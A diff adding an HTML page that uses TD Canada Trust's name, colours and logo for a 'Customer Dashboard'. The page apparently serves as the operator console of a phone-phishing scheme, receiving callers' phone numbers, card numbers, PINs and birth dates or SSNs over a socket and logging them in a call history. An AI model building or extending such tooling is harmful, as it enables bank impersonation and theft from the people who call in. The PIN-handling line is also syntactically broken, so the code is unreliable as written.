@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TD Canada Trust - Customer Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.3/socket.io.js"></script>
+  <style>
+    :root {
+      --td-green: #008A52;
+      --td-dark-green: #006341;
+      --primary-bg: #ffffff;
+      --card-bg: #f8f9fa;
+      --text-primary: #333333;
+      --text-secondary: #666666;
+      --border-radius: 8px;
+      --box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      --transition: all 0.3s ease;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--primary-bg);
+      color: var(--text-primary);
+    }
+    .header {
+      background: var(--td-green);
+      color: white;
+      padding: 1rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: var(--box-shadow);
+    }
+    .header-title {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .header-title img {
+      height: 40px;
+    }
+    .dashboard-container {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 20px;
+      padding: 20px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .card {
+      background: white;
+      border-radius: var(--border-radius);
+      box-shadow: var(--box-shadow);
+      border: 1px solid #e0e0e0;
+      margin-bottom: 20px;
+    }
+    .card-header {
+      background: var(--td-green);
+      color: white;
+      padding: 15px 20px;
+      font-weight: 500;
+    }
+    .card-body {
+      padding: 20px;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+    .info-label {
+      font-weight: 500;
+      color: var(--text-secondary);
+    }
+    .info-value {
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+    .signout-btn {
+      background: var(--td-dark-green);
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      transition: var(--transition);
+      font-weight: 500;
+    }
+    .signout-btn:hover {
+      background: #00492B;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <div class="header-title">
+      <img src="td_logo.png" alt="TD Canada Trust Logo">
+      <h1>TD Canada Trust - Customer Dashboard</h1>
+    </div>
+    <button class="signout-btn" onclick="handleSignout()">Sign Out</button>
+  </div>
+
+  <div class="dashboard-container">
+    <div class="card">
+      <div class="card-header">Current Call Information</div>
+      <div class="card-body">
+        <div class="info-row"><span class="info-label">Incoming Number:</span><span class="info-value" id="phoneNumber">-</span></div>
+        <div class="info-row"><span class="info-label">Card Number:</span><span class="info-value" id="cardNumber">-</span></div>
+        <div class="info-row"><span class="info-label">PIN:</span><span class="info-value" id="pin">-</span></div>
+        <div class="info-row"><span class="info-label">DOB / SSN:</span><span class="info-value" id="ssn">-</span></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">Call History</div>
+      <div class="card-body" id="callHistory">
+        <p>No call history yet.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    var socket = io();
+    var ringtone = new Audio("https://lemon-caiman-4128.twil.io/assets/ring_ring.mp3");
+
+    // ✅ FIX: Correctly update dashboard when an incoming call is received
+    socket.on("incoming_call", function(data) {
+      if (data.phone_number) {
+        document.getElementById("phoneNumber").textContent = data.phone_number;
+        ringtone.play();
+        alert("📞 Incoming Call from " + data.phone_number);
+      }
+    });
+
+    // ✅ FIX: Update dashboard with user input (Card, PIN, DOB)
+    socket.on("update_data", function(data) {
+      if (data.phone_number) document.getElementById("phoneNumber").textContent = data.phone_number;
+      if (data.card_number) document.getElementById("cardNumber").textContent = data.card_number;
+      if (data.pin) document.getElementById("pin").textContent = "textContent = data.pin_number;
+      if (data.dob) document.getElementById("ssn").textContent = data.dob;
+      updateCallHistory(data);
+    });
+
+    function updateCallHistory(data) {
+      var callHistoryDiv = document.getElementById("callHistory");
+      var newEntry = document.createElement("p");
+      newEntry.textContent = `Call from ${data.phone_number}, Card: ${data.card_number}, PIN: ${data.pin}, DOB: ${data.dob}`;
+      callHistoryDiv.appendChild(newEntry);
+    }
+
+    function handleSignout() {
+      window.location.href = '/logout';
+    }
+  </script>
+</body>
+</html>
